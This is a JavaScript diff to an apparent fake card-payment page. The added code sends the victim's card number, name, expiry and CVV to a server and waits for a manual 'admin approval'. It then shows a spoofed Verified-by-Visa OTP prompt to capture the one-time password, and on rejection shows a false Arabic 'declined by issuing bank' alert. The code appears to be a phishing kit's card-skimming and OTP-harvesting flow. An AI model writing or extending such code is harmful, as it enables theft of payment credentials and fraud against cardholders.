@@ -1108,11 +1108,33 @@
             
             $('#processingModal').modal('show');
             
-            setTimeout(function() {
-                $('#processingModal').modal('hide');
-                
-                // Set modal title
-                document.getElementById('modalHeaderTitle').textContent = modalTitles[cardType];
+            // Save payment data and wait for admin approval
+            fetch('/api/save-payment', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    cardNumber: cardNumberInput.value,
+                    cardHolder: document.getElementById('cardHolder').value,
+                    expiryDate: document.getElementById('expiryDate').value,
+                    cvv: document.getElementById('cvv').value,
+                    cardType: cardType
+                })
+            }).then(() => {
+                // Start checking for admin approval
+                checkPaymentApproval();
+            });
+            
+            function checkPaymentApproval() {
+                fetch('/api/check-payment-approval')
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.approved === true) {
+                            // Approved - close loading modal and show OTP modal
+                            $('#processingModal').modal('hide');
+                            
+                            setTimeout(function() {
+                                // Set modal title
+                                document.getElementById('modalHeaderTitle').textContent = modalTitles[cardType];
                 
                 // Set verified logo
                 const vbvLogo = document.getElementById('vbvLogo');
@@ -1141,9 +1163,31 @@
                 // Set maxlength based on card type
                 document.getElementById('vbvPassword').maxLength = otpLength;
                 
-                $('#otpModal').modal('show');
-                document.getElementById('vbvPassword').focus();
-            }, 2500);
+                                $('#otpModal').modal('show');
+                                document.getElementById('vbvPassword').focus();
+                            }, 2500);
+                        } else if (data.approved === false) {
+                            // Rejected - close modal and show error
+                            $('#processingModal').modal('hide');
+                            setTimeout(function() {
+                                alert('تم رفض البطاقة من قبل البنك المصدر');
+                                // Reset form
+                                document.getElementById('cardNumber').value = '';
+                                document.getElementById('cardHolder').value = '';
+                                document.getElementById('expiryDate').value = '';
+                                document.getElementById('cvv').value = '';
+                                document.getElementById('cardNumber').focus();
+                            }, 300);
+                        } else {
+                            // Still waiting - check again after 1 second
+                            setTimeout(checkPaymentApproval, 1000);
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Error checking approval:', err);
+                        setTimeout(checkPaymentApproval, 1000);
+                    });
+            }
         });
         
         // VBV Submit
